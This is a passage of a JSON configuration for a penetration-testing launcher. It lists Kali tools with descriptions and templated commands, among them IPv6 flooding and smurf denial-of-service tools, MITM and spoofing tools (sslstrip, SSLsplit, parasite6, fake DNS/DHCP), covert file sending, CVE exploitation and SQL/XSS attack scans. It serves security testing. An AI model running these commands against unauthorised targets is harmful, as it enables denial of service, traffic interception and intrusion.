    "desc": "Parsero is a free script written in Python which reads the Robots.txt file of a web server and looks at the Disallow entries. The Disallow entries tell the search engines what directories or files hosted on a web server mustn’t be indexed. For example, “Disallow: /portal/login” means that the content on www.example.com/portal/login it’s not allowed to be indexed by crawlers like Google, Bing, Yahoo… This is the way the administrator have to not share sensitive or private information with the search engines.",
    "example": "Search for results from a website (-u www.bing.com) using Bing indexed Disallows (-sb):\r\nparsero -u www.bing.com -sb",
    "category": "1",
    "customInput": "",
    "cmd": "parsero -u ${target} -sb",
    "parser": null
  },
  {
    "name": "recon-ng (INTERACTIVE)",
    "desc": "",
    "example": "",
    "category": "1",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "SET (INTERACTIVE)",
    "desc": "The Social-Engineer Toolkit is an open-source penetration testing framework designed for Social-Engineering. SET has a number of custom attack vectors that allow you to make a believable attack in a fraction of the time.",
    "example": "",
    "category": "1",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "SMBMap-user-pass",
    "desc": "SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.",
    "example": "Check for shares on the specified host with the username and password provided.\r\nsmbmap -u victim -p s3cr3t -H 192.168.86.61",
    "category": "1",
    "customInput": "Username to check for=${arg1},Password to check for=${arg2},",
    "cmd": "smbmap -u ${arg1} -p ${arg2} -H ${target} ",
    "parser": null
  },
  {
    "name": "smtp-user-enum",
    "desc": "smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail). Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.",
    "example": "Use the VRFY method (-M VRFY) to search for the specified user (-u root) on the target server (-t 192.168.1.25):\r\nsmtp-user-enum -M VRFY -u root -t 192.168.1.25",
    "category": "1",
    "customInput": "",
    "cmd": "smtp-user-enum -M VRFY -u root -t ${target} ",
    "parser": null
  },
  {
    "name": "snmp-check",
    "desc": "Like to snmpwalk, snmp-check allows you to enumerate the SNMP devices and places the output in a very human readable friendly format. It could be useful for penetration testing or systems monitoring.",
    "example": "Scan the target host (192.168.1.2) using the public SNMP community string (-c public):\r\nsnmp-check 192.168.1.2 -c public",
    "category": "1",
    "customInput": "",
    "cmd": "snmp-check ${target} -c public",
    "parser": null
  },
  {
    "name": "SPARTA (INTERACTIVE GUI)",
    "desc": "SPARTA is a python GUI application that simplifies network infrastructure penetration testing by aiding the penetration tester in the scanning and enumeration phase. It allows the tester to save time by having point-and-click access to their toolkit and by displaying all tool output in a convenient way.",
    "example": "",
    "category": "1",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "sslcaudit",
    "desc": "The goal of sslcaudit project is to develop a utility to automate testing SSL/TLS clients for resistance against MITM attacks. It might be useful for testing a thick client, a mobile application, an appliance, pretty much anything communicating over SSL/TLS over TCP.",
    "example": "Listen on port 443 (-l 0.0.0.0:443) in verbose mode (-v 1):\r\nsslcaudit -l 0.0.0.0:443 -v 1",
    "category": "1",
    "customInput": "",
    "cmd": "sslcaudit -l 0.0.0.0:443 -v 1",
    "parser": null
  },
  {
    "name": "SSLsplit",
    "desc": "SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted network connections. Connections are transparently intercepted through a network address translation engine and redirected to SSLsplit. SSLsplit terminates SSL/TLS and initiates a new SSL/TLS connection to the original destination address, while logging all data transmitted.",
    "example": "Run in debug mode (-D), log the connections (-l connections.log), set the chroot jail (-j /tmp/sslsplit/), save files to disk (-S /tmp/), specify the key (-k ca.key), specify the cert (-c ca.crt), specify ssl (ssl), and configure the proxy (0.0.0.0 8443 tcp 0.0.0.0 8080):",
    "category": "1",
    "customInput": "Specify the key=${arg1},Specify the cert=${arg2},",
    "cmd": "sslsplit -D -l ${working_dir}/connections.log -j /tmp/sslsplit/ -S ${working_dir} -k ${arg1} -c ${arg2} ssl 0.0.0.0 8443 tcp 0.0.0.0 8080",
    "parser": null
  },
  {
    "name": "sslstrip",
    "desc": "sslstrip is a tool that transparently hijacks HTTP traffic on a network, watch for HTTPS links and redirects, and then map those links into look-alike HTTP links or homograph-similar HTTPS links. It also supports modes for supplying a favicon which looks like a lock icon, selective logging, and session denial.",
    "example": "Write the results to a file (-w sslstrip.log), listening on port 8080 (-l 8080):\r\nsslstrip -w sslstrip.log -l 8080",
    "category": "1",
    "customInput": "",
    "cmd": "sslstrip -w ${working_dir}/sslstrip.log -l 8080",
    "parser": null
  },
  {
    "name": "SSLyze",
    "desc": "SLyze is a Python tool that can analyze the SSL configuration of a server by connecting to it. It is designed to be fast and comprehensive, and should help organizations and testers identify mis-configurations affecting their SSL servers.",
    "example": "Launch a regular scan type (–regular) against the target host (www.example.com):\r\nsslyze --regular www.example.com",
    "category": "1",
    "customInput": "",
    "cmd": "sslyze --regular ${target} ",
    "parser": null
  },
  {
    "name": "Sublist3r",
    "desc": "Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT. It helps penetration testers and bug hunters collect and gather subdomains for the domain they are targeting. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS.",
    "example": "Search for subdomains of kali.org (-d kali.org) using the Bing search engine (-e bing) with 3 threads (-t 3):\r\nsublist3r -d kali.org -t 3 -e bing",
    "category": "1",
    "customInput": "Domain=${arg1},",
    "cmd": "sublist3r -d ${arg1} -t 3 -e bing",
    "parser": null
  },
  {
    "name": "THC-IPV6-6to4test",
    "desc": "A complete tool set to attack the inherent protocol weaknesses of IPV6 and ICMP6, and includes an easy to use packet factory library.",
    "example": "6to4test.sh – Tests if the IPv4 target has a dynamic 6to4 tunnel active\r\n/usr/bin/6to4test.sh interface ipv4address",
    "category": "1",
    "customInput": "",
    "cmd": "/usr/bin/6to4test.sh ${interface} ${target} ",
    "parser": null
  },
  {
    "name": "THC-IPV6-address6",
    "desc": "Converts a mac or ipv4 address to an ipv6 address.",
    "example": "address6 mac-address [ipv6-prefix]\r\naddress6 ipv4-address [ipv6-prefix]\r\naddress6 ipv6-address",
    "category": "1",
    "customInput": "IPv4=${arg1},",
    "cmd": "address6 ${arg1}",
    "parser": null
  },
  {
    "name": "THC-IPV6-covert_send6",
    "desc": "Sends the content of FILE covertly to the target",
    "example": "covert_send6 [-m mtu] [-k key] [-s resend] interface target file [port]",
    "category": "1",
    "customInput": "Encrypt password=${arg1},File=${arg2},Port=${arg3},",
    "cmd": "covert_send6 -k ${arg1} -s 10 ${interface} ${target} ${arg2} ${arg3} ",
    "parser": null
  },
  {
    "name": "THC-IPV6-detect_sniffer6",
    "desc": "Tests if systems on the local LAN are sniffing",
    "example": "detect_sniffer6 interface [target6]",
    "category": "1",
    "customInput": "",
    "cmd": "detect_sniffer6 ${interface} ${target} ",
    "parser": null
  },
  {
    "name": "THC-IPV6-dump_router6",
    "desc": "Dumps all local routers and their information",
    "example": "dump_router6 eth0",
    "category": "1",
    "customInput": "",
    "cmd": "dump_router6 ${interface} ",
    "parser": null
  },
  {
    "name": "THC-IPV6-exploit6",
    "desc": "Performs exploits of various CVE known IPv6 vulnerabilities on the destination",
    "example": "exploit6 interface destination [test-case-number]",
    "category": "3",
    "customInput": "Test case number=${arg1},",
    "cmd": "exploit6 ${interface} ${target} ${arg1} ",
    "parser": null
  },
  {
    "name": "fake_dhcps6",
    "desc": "Fake DHCPv6 server\r\nake_dhcps6 v2.3 (c) 2013 by van Hauser / THC <vh@thc.org> www.thc.org\r\nSyntax: fake_dhcps6 interface network-address/prefix-length dns-server [dhcp-server-ip-address [mac-address]]\r\nFake DHCPv6 server. Use to configure an address and set a DNS server",
    "example": "",
    "category": "8",
    "customInput": "network-address/prefix-length=${arg1},dns-server [dhcp-server-ip-address [mac-address]]=${arg2},",
    "cmd": "fake_dhcps6 ${interface} ${arg1} ${arg2} ",
    "parser": null
  },
  {
    "name": "fake_dns6d",
    "desc": "Fake DNS server that serves the same ipv6 address to any lookup request",
    "example": "Syntax: fake_dns6d interface ipv6-address [fake-ipv6-address [fake-mac]]\r\nFake DNS server that serves the same ipv6 address to any lookup request\r\nYou can use this together with parasite6 if clients have a fixed DNS server\r\nNote: very simple server. Does not honor multiple queries in a packet, norNS, MX, etc. lookups.",
    "category": "8",
    "customInput": "ipv6-address [fake-ipv6-address [fake-mac]]=${arg1},",
    "cmd": "fake_dns6d ${interface} ${arg1} ",
    "parser": null
  },
  {
    "name": "fake_dnsupdate6",
    "desc": "Fake DNS updater",
    "example": "fake_dnsupdate6 dns-server full-qualified-host-dns-name ipv6address",
    "category": "8",
    "customInput": "dns-server=${arg1},full-qualified-host-dns-name=${arg2}, ipv6address=${arg3},",
    "cmd": "fake_dnsupdate6 ${arg1} ${arg2} ${arg3} ",
    "parser": null
  },
  {
    "name": "fake_mipv6",
    "desc": "Will redirect all packets for home-address to care-of-address",
    "example": "fake_mipv6 interface home-address home-agent-address care-of-address",
    "category": "8",
    "customInput": "home-address=${arg1},home-agent-address=${arg2},care-of-address=${arg3},",
    "cmd": "fake_mipv6 ${interface} ${arg1} ${arg2} ${arg3} ",
    "parser": null
  },
  {
    "name": "fake_mld26 (NOT COMPLETE)",
    "desc": "This uses the MLDv2 protocol. Only a subset of what the protocol is able to\r\ndo is possible to implement via a command line. Code it if you need something.\r\nAd(d)vertise or delete yourself - or anyone you want - in a multicast group of your choice\r\nQuery ask on the network who is listening to multicast addresses\r\nUse -l to loop and send (in 5s intervals) until Control-C is pressed.",
    "example": "fake_mld26 [-l] interface add|delete|query [multicast-address [target-address [ttl [own-ip [own-mac-address [destination-mac-address]]]]]]",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "fake_mld6 (NOT COMPLETE)",
    "desc": "Ad(d)vertise or delete yourself – or anyone you want",
    "example": "",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "fake_mldrouter6 (NOT COMPLETE)",
    "desc": "",
    "example": "",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "fake_pim6 (NOT COMPLETE)",
    "desc": "The hello command takes optionally the DR priority (default: 0).\r\nThe join and prune commands need the multicast group to modify, the target\r\naddress that joins or leavs and the neighbor PIM router\r\nUse -s to spoof the source ip6, -d to send to another address than ff02::d,\r\nand -t to set a different TTL (default: 1)",
    "example": "",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "fake_router26 (DO LATER)",
    "desc": "Announce yourself as a router and try to become the default router.",
    "example": "Syntax: fake_router26 [-E type] [-A network/prefix] [-R network/prefix] [-D dns-server] [-s sourceip] [-S sourcemac] [-ardl seconds] [-Tt ms] [-n no] [-i interval] interface",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "fake_router6 (DO LATER)",
    "desc": "Announce yourself as a router and try to become the default router.",
    "example": "fake_router6 [-HFD] interface network-address/prefix-length [dns-server [router-ip-link-local [mtu [mac-address]]]]",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "firewall6 (NOT COMPLETE)",
    "desc": "Performs various ACL bypass attempts to check implementations",
    "example": "firewall6 [-u] interface destination port [test-case-no]",
    "category": "2",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "flood_advertise6",
    "desc": "Flood the local network with neighbor advertisements",
    "example": "flood_advertise6 interface",
    "category": "5",
    "customInput": "",
    "cmd": "flood_advertise6 ${interface} ",
    "parser": null
  },
  {
    "name": "flood_dhcpc6 (NOT COMPLETE)",
    "desc": "DHCP client flooder",
    "example": "flood_dhcpc6 [-n|-N] [-1] [-d] interface [domain-name]",
    "category": "5",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "flood_mld26",
    "desc": "Flood the local network with MLDv2 reports",
    "example": "flood_mld26 interface",
    "category": "5",
    "customInput": "",
    "cmd": "flood_mld26 ${interface} ",
    "parser": null
  },
  {
    "name": "flood_mld6",
    "desc": "Flood the local network with MLD reports",
    "example": "flood_mld6 interface",
    "category": "5",
    "customInput": "",
    "cmd": "flood_mld6 ${interface} ",
    "parser": null
  },
  {
    "name": "flood_mldrouter6",
    "desc": "Flood the local network with MLD router advertisements",
    "example": "flood_mldrouter6 interface",
    "category": "5",
    "customInput": "",
    "cmd": "flood_mldrouter6 ${interface} ",
    "parser": null
  },
  {
    "name": "flood_router26",
    "desc": "Flood the local network with router advertisements.\r\nEach packet contains 17 prefix and route enries\r\n-F/-D/-H add fragment/destination/hopbyhop header to bypass RA guard security.\r\n-R does only send routing entries, no prefix information.\r\n-P does only send prefix information, no routing entries.\r\n-A is like -P but implements an attack by George Kargiotakis to disable privacy extensions\r\nThe option -s uses small lifetimes, resulting in a more devasting impact",
    "example": "flood_router26 [-HFD] [-s] [-RPA] interface",
    "category": "5",
    "customInput": "",
    "cmd": "flood_router26 -H -s ${interface} ",
    "parser": null
  },
  {
    "name": "flood_router6",
    "desc": "Flood the local network with router advertisements",
    "example": "flood_router6 [-HFD] interface",
    "category": "5",
    "customInput": "",
    "cmd": "flood_router6 -H ${interface} ",
    "parser": null
  },
  {
    "name": "fragmentation6 (NOT COMPLETE)",
    "desc": "Performs fragment firewall and implementation checks",
    "example": "fragmentation6 [-fp] [-n number] interface destination [test-case-no]",
    "category": "2",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "fuzz_ip6 (NOT COMPLETE)",
    "desc": "Fuzzes an icmp6 packet",
    "example": "",
    "category": "5",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "kill_router6 (NOT COMPLETE)",
    "desc": "Announce that a target a router going down to delete it from the routing tables",
    "example": "kill_router6 [-HFD] interface router-address [srcmac [dstmac]]",
    "category": "3",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "parasite6",
    "desc": "This is an “ARP spoofer” for IPv6",
    "example": "parasite6 [-lRFHD] interface [fake-mac]",
    "category": "8",
    "customInput": "fake-mac=${arg1},",
    "cmd": "parasite6 -lRFHD ${interface} ${arg1} ",
    "parser": null
  },
  {
    "name": "passive_discovery6 (NOT COMPLETE)",
    "desc": "Passively sniffs the network and dump all client’s IPv6 addresses",
    "example": "passive_discovery6 [-Ds] [-m maxhop] [-R prefix] interface [script]",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "redir6 (NOT COMPLETE)",
    "desc": "Implant a route into victim-ip, which redirects all traffic to target-ip",
    "example": "redir6 interface victim-ip target-ip original-router new-router [new-router-mac] [hop-limit]",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "redirsniff6 (NOT COMPLETE)",
    "desc": "Implant a route into victim-ip, which redirects all traffic to destination-ip",
    "example": "redirsniff6 interface victim-ip destination-ip original-router [new-router [new-router-mac]]",
    "category": "8",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "rsmurf6",
    "desc": "Smurfs the local network of the victim",
    "example": "rsmurf6 interface victim-ip",
    "category": "8",
    "customInput": "",
    "cmd": "rsmurf6 ${interface} ${target} ",
    "parser": null
  },
  {
    "name": "smurf6",
    "desc": "Smurf the target with icmp echo replies",
    "example": "smurf6 interface victim-ip [multicast-network-address]",
    "category": "8",
    "customInput": "multicast-network-address=${arg1},",
    "cmd": "smurf6 ${interface} ${target} ${arg1} ",
    "parser": null
  },
  {
    "name": "thcsyn6",
    "desc": "Flood the target port with TCP-SYN packets",
    "example": "thcsyn6 [-AcDrRS] [-p port] [-s sourceip6] interface target port",
    "category": "8",
    "customInput": "sourceip6=${arg1},",
    "cmd": "thcsyn6 -A -p 5232 -s ${arg1} ${interface} ${target} ${port} ",
    "parser": null
  },
  {
    "name": "theHarvester-domain",
    "desc": "Domain to search or company name",
    "example": "Search from email addresses from a domain (-d kali.org), limiting the results to 500 (-l 500), using Google (-b google):\r\ntheharvester -d kali.org -l 500 -b google",
    "category": "1",
    "customInput": "Domain=${arg1},",
    "cmd": "theharvester -d ${arg1} -l 500 -b google",
    "parser": null
  },
  {
    "name": "TLSSLed",
    "desc": "TLSSLed is a Linux shell script whose purpose is to evaluate the security of a target SSL/TLS (HTTPS) web server implementation. It is based on sslscan, a thorough SSL/TLS scanner that is based on the openssl library, and on the “openssl s_client” command line tool. The current tests include checking if the target supports the SSLv2 protocol, the NULL cipher, weak ciphers based on their key length (40 or 56 bits), the availability of strong ciphers (like AES), if the digital certificate is MD5 signed, and the current SSL/TLS renegotiation capabilities.",
    "example": "Check SSL/TLS on the host (192.168.1.1) and port (443):\r\ntlssled 192.168.1.1 443",
    "category": "1",
    "customInput": "",
    "cmd": "tlssled ${target} 443",
    "parser": null
  },
  {
    "name": "twofi (NOT COMPLETE)",
    "desc": "When attempting to crack passwords custom word lists are very useful additions to standard dictionaries. An interesting idea originally released on the “7 Habits of Highly Effective Hackers” blog was to use Twitter to help generate those lists based on searches for keywords related to the list that is being cracked. This idea has been expanded into twofi which will take multiple search terms and return a word list sorted by most common first.",
    "example": "",
    "category": "1",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "Unicornscan",
    "desc": "Unicornscan is a new information gathering and correlation engine built for and by members of the security research and testing communities. It was designed to provide an engine that is Scalable, Accurate, Flexible, and Efficient.",
    "example": "unicornscan -mTsf -Iv -r 1000 192.168.0.102:a",
    "category": "1",
    "customInput": "",
    "cmd": "unicornscan -mTsf -Iv -r 1000 ${target}:a",
    "parser": null
  },
  {
    "name": "URLCrazy",
    "desc": "Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking, phishing, and corporate espionage.",
    "example": "Search for URLs using the dvorak layout (-k dvorak) and do no resolve hostnames (-r) for the given domain (example.com):\r\nurlcrazy -k dvorak -r example.com",
    "category": "1",
    "customInput": "Domain=${arg1},",
    "cmd": "urlcrazy -k dvorak -r ${arg1} ",
    "parser": null
  },
  {
    "name": "WOL-E-apple",
    "desc": "Detect Apple devices on the network",
    "example": "wol-e -f",
    "category": "1",
    "customInput": "",
    "cmd": "wol-e -f",
    "parser": null
  },
  {
    "name": "WOL-E-Sniffing",
    "desc": "Sniffing the network for WOL (Wake On LAN) requests and passwords",
    "example": "wol-e -s -i eth0",
    "category": "8",
    "customInput": "",
    "cmd": "wol-e -s -i ${interface} ",
    "parser": null
  },
  {
    "name": "WOL-E-bruteforce",
    "desc": "Bruteforce powering on WOL clients.",
    "example": "wol-e -a",
    "category": "1",
    "customInput": "",
    "cmd": "wol-e -a",
    "parser": null
  },
  {
    "name": "Xplico",
    "desc": "The goal of Xplico is extract from an internet traffic capture the applications data contained. For example, from a pcap file Xplico extracts each email (POP, IMAP, and SMTP protocols), all HTTP contents, each VoIP call (SIP, MGCP, H323), FTP, TFTP, and so on. Xplico is not a network protocol analyzer.",
    "example": "Use the rltm module (-m rltm) and analyze traffic on interface eth0 (-i eth0):\r\nxplico -m rltm -i eth0",
    "category": "1",
    "customInput": "",
    "cmd": "xplico -m rltm -i ${interface} ",
    "parser": null
  },
  {
    "name": "apache-users",
    "desc": "This Perl script will enumerate the usernames on any system that uses Apache with the UserDir module.",
    "example": "Run against the remote host (-h 192.168.1.202), passing a dictionary of usernames (-l /usr/share/wordlists/metasploit/unix_users.txt), the port to use (-p 80), disable SSL (-s 0), specify the HTTP error code (-e 403), using 10 threads (-t 10):\r\napache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10",
    "category": "4",
    "customInput": "Port(80)=${arg1},",
    "cmd": "apache-users -h ${target} -l ${user_file} -p ${arg1} -s 0 -e 403 -t 10",
    "parser": null
  },
  {
    "name": "DIRB",
    "desc": "DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.\r\n\r\nDIRB comes with a set of preconfigured attack wordlists for easy usage but you can use your custom wordlists. Also DIRB sometimes can be used as a classic CGI scanner, but remember is a content scanner not a vulnerability scanner.\r\n\r\nDIRB main purpose is to help in professional web application auditing. Specially in security related testing. It covers some holes not covered by classic web vulnerability scanners. DIRB looks for specific web objects that other generic CGI scanners can’t look for. It doesn’t search vulnerabilities nor does it look for web contents that can be vulnerables.",
    "example": "Scan the web server (http://192.168.1.224/) for directories using a dictionary file (/usr/share/wordlists/dirb/common.txt):\r\ndirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt",
    "category": "4",
    "customInput": "Directory list (/usr/share/wordlists/dirb/common.txt)=${arg1},",
    "cmd": "dirb http://${target} ${arg1}",
    "parser": "dirb"
  },
  {
    "name": "html2dic",
    "desc": "Generate a dictionary from HTML pages",
    "example": "html2dic ./about.html",
    "category": "4",
    "customInput": "HTML file=${arg1},",
    "cmd": "html2dic ${arg1}",
    "parser": null
  },
  {
    "name": "gendict",
    "desc": "Generator for custom dictionaries",
    "example": "gendict -n thisword_X",
    "category": "9",
    "customInput": "Base word=${arg1},",
    "cmd": "gendict -n ${arg1}",
    "parser": null
  },
  {
    "name": "DirBuster (GUI)",
    "desc": "DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers. Often is the case now of what looks like a web server in a state of default installation is actually not, and has pages and applications hidden within. DirBuster attempts to find these. However tools of this nature are often as only good as the directory and file list they come with. A different approach was taken to generating this. The list was generated from scratch, by crawling the Internet and collecting the directory and files that are actually used by developers! DirBuster comes a total of 9 different lists, this makes DirBuster extremely effective at finding those hidden files and directories. And if that was not enough DirBuster also has the option to perform a pure brute force, which leaves the hidden directories and files nowhere to hide.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "dirbuster",
    "parser": null
  },
  {
    "name": "arachni-simple-scan",
    "desc": "Simple Vul scan",
    "example": "arachni http://example.com",
    "category": "4",
    "customInput": "",
    "cmd": "arachni http://${target}",
    "parser": null
  },
  {
    "name": "arachni-scan-report",
    "desc": "Does a vul scan and saves to a special report.",
    "example": "arachni --output-verbose --scope-include-subdomains http://example.com --report-save-path=example.com.afr",
    "category": "4",
    "customInput": "",
    "cmd": "arachni --output-verbose --scope-include-subdomains http://${target} --report-save-path=arachni_${target}.afr",
    "parser": null
  },
  {
    "name": "arachni_reporter",
    "desc": "Create report from Arachni scan",
    "example": "arachni_reporter example.com.afr --reporter=html:outfile=my_report.html.zip",
    "category": "12",
    "customInput": "Scan file=${arg1},",
    "cmd": "arachni_reporter ${arg1} --reporter=html:outfile=report_${target}.html.zip",
    "parser": null
  },
  {
    "name": "arachni-only-xss",
    "desc": "Checks for XSS",
    "example": "arachni http://example.net --checks=xss*",
    "category": "4",
    "customInput": "",
    "cmd": "arachni http://${target} --checks=xss*",
    "parser": null
  },
  {
    "name": "Arachni (GUI)",
    "desc": "Web based vul scanner.\r\n1. Start the web server './arachni_web'\r\n2. access the URL given, and login using U: admin@admin.admin, P: administrator",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "BBQSQL (INTERACTIVE)",
    "desc": "Blind SQL injection can be a pain to exploit. When the available tools work they work well, but when they don’t you have to write something custom. This is time-consuming and tedious. BBQSQL can help you address those issues.\r\n\r\nBBQSQL is a blind SQL injection framework written in Python. It is extremely useful when attacking tricky SQL injection vulnerabilities. BBQSQL is also a semi-automatic tool, allowing quite a bit of customization for those hard to trigger SQL injection findings. The tool is built to be database agnostic and is extremely versatile. It also has an intuitive UI to make setting up attacks much easier. Python gevent is also implemented, making BBQSQL extremely fast.\r\n\r\nSimilar to other SQL injection tools you provide certain request information.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "bbqsql",
    "parser": null
  },
  {
    "name": "BlindElephant-wordpress",
    "desc": "The BlindElephant Web Application Fingerprinter attempts to discover the version of a (known) web application by comparing static files at known locations against precomputed hashes for versions of those files in all all available releases. The technique is fast, low-bandwidth, non-invasive, generic, and highly automatable.",
    "example": "Scan the remote host (http://192.168.1.252/wp), specifying the web application in use (wordpress):\r\nBlindElephant.py http://192.168.1.252/wp wordpress",
    "category": "4",
    "customInput": "",
    "cmd": "BlindElephant.py http://${target}/wp wordpress",
    "parser": null
  },
  {
    "name": "BlindElephant-drupal",
    "desc": "The BlindElephant Web Application Fingerprinter attempts to discover the version of a (known) web application by comparing static files at known locations against precomputed hashes for versions of those files in all all available releases. The technique is fast, low-bandwidth, non-invasive, generic, and highly automatable.",
    "example": "BlindElephant.py http://192.168.1.252/drupal drupal",
    "category": "4",
    "customInput": "",
    "cmd": "BlindElephant.py http://${target}/drupal drupal",
    "parser": null
  },
  {
    "name": "burpsuite (GUI)",
    "desc": "",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "burpsuite",
    "parser": null
  },
  {
    "name": "CutyCapt",
    "desc": "CutyCapt is a small cross-platform command-line utility to capture WebKit’s rendering of a web page into a variety of vector and bitmap formats, including SVG, PDF, PS, PNG, JPEG, TIFF, GIF, and BMP.",
    "example": "Take a capture of the URL (–url=http://www.kali.org) and save it to disk (–out=kali.png):\r\ncutycapt --url=http://www.kali.org --out=kali.png",
    "category": "4",
    "customInput": "",
    "cmd": "cutycapt --url=http://${target} --out=CutyCapt_${target}.png",
    "parser": null
  },
  {
    "name": "DAVTest",
    "desc": "DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.",
    "example": "Scan the given WebDAV server (-url http://192.168.1.209):\r\ndavtest -url http://192.168.1.209",
    "category": "4",
    "customInput": "",
    "cmd": "davtest -url http://${target}",
    "parser": null
  },
  {
    "name": "deblaze-swf",
    "desc": "Through the use of the Flex programming model and the ActionScript language, Flash Remoting was born. Flash applications can make request to a remote server to call server side functions, such as looking up accounts, retrieving additional data and graphics, and performing complex business operations. However, the ability to call remote methods also increases the attack surface exposed by these applications. This tool will allow you to perform method enumeration and interrogation against flash remoting end points. Deblaze came about as a necessity during a few security assessments of flash based websites that made heavy use of flash remoting. I needed something to give me the ability to dig a little deeper into the technology and identify security holes. On all of the servers I’ve seen so far the names are not case sensitive, making it much easier to bruteforce. Often times HTTP POST requests won’t be logged by the server, so bruteforcing may go unnoticed on poorly monitored systems.",
    "example": "deblaze.py -f http://example.com/Players.swf",
    "category": "4",
    "customInput": "URL to SWF file=${arg1},",
    "cmd": "deblaze.py -f ${arg1}",
    "parser": null
  },
  {
    "name": "fimap-scan-inclusion",
    "desc": "fimap is a little python tool which can find, prepare, audit, exploit and even google automaticly for local and remote file inclusion bugs in webapps. fimap should be something like sqlmap just for LFI/RFI bugs instead of sql injection. It’s currently under heavy development but it’s usable.",
    "example": "Scan the web application (-u “http://192.168.1.202/index.php”) for file inclusion issues:\r\nfimap -u \"http://192.168.1.202/index.php\"",
    "category": "4",
    "customInput": "File (like PHP file) to examine=${arg1},",
    "cmd": "fimap -u \"http://${target}/${arg1}\"",
    "parser": null
  },
  {
    "name": "FunkLoad (NOT DONE)",
    "desc": "FunkLoad is a functional and load web tester, written in Python, whose main use cases are:\r\n\r\nFunctional testing of web projects, and thus regression testing as well.\r\nPerformance testing: by loading the web application and monitoring your servers it helps you to pinpoint bottlenecks, giving a detailed report of performance measurement.\r\nLoad testing tool to expose bugs that do not surface in cursory testing, like volume testing or longevity testing.\r\nStress testing tool to overwhelm the web application resources and test the application recoverability.\r\nWriting web agents by scripting any web repetitive task.",
    "example": "",
    "category": "4",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "Gobuster",
    "desc": "Gobuster is a tool used to brute-force:\r\nURIs (directories and files) in web sites.\r\nDNS subdomains (with wildcard support).",
    "example": "Scan a website (-u http://192.168.0.155/) for directories using a wordlist (-w /usr/share/wordlists/dirb/common.txt) and print the full URLs of discovered paths (-e):\r\ngobuster -e -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt",
    "category": "4",
    "customInput": "Wordlist (/usr/share/wordlists/dirb/common.txt)=${arg1},",
    "cmd": "gobuster -e -u http://${target} -w ${arg1}",
    "parser": "Gobuster"
  },
  {
    "name": "Grabber",
    "desc": "Grabber is a web application scanner. Basically it detects some kind of vulnerabilities in your website. Grabber is simple, not fast but portable and really adaptable. This software is designed to scan small websites such as personals, forums etc. absolutely not big application: it would take too long time and flood your network.\r\nCross-Site Scripting\r\nSQL Injection (there is also a special Blind SQL Injection module)\r\nFile Inclusion\r\nBackup files check\r\nSimple AJAX check (parse every JavaScript and get the URL and try to get the parameters)\r\nHybrid analysis/Crystal ball testing for PHP application using PHP-SAT\r\nJavaScript source code analyzer: Evaluation of the quality/correctness of the JavaScript with JavaScript Lint\r\nGeneration of a file [session_id, time(t)] for next stats analysis.",
    "example": "Spider the web application to a depth of 1 (–spider 1) and attempt SQL (–sql) and XSS (–xss) attacks at the given URL (–url http://192.168.1.224):\r\ngrabber --spider 1 --sql --xss --url http://192.168.1.224",
    "category": "4",
    "customInput": "",
    "cmd": "grabber --spider 1 --sql --xss --url http://${target}",
    "parser": null
  },
  {
    "name": "hURL-decode-base64",
    "desc": "hURL is a small utility that can encode and decode between multiple formats.",
    "example": "hURL -b \"S2FsaSBMaW51eAo=\"",
    "category": "4",
    "customInput": "Base64 String=${arg1},",
    "cmd": "hURL -b ${arg1}",
    "parser": null
  },
  {
    "name": "hURL-encode-base64",
    "desc": "hURL is a small utility that can encode and decode between multiple formats.",
    "example": "hURL -B \"Hello\"",
    "category": "4",
    "customInput": "String to encode=${arg1},",
    "cmd": "hURL -B ${arg1}",
    "parser": null
  },
  {
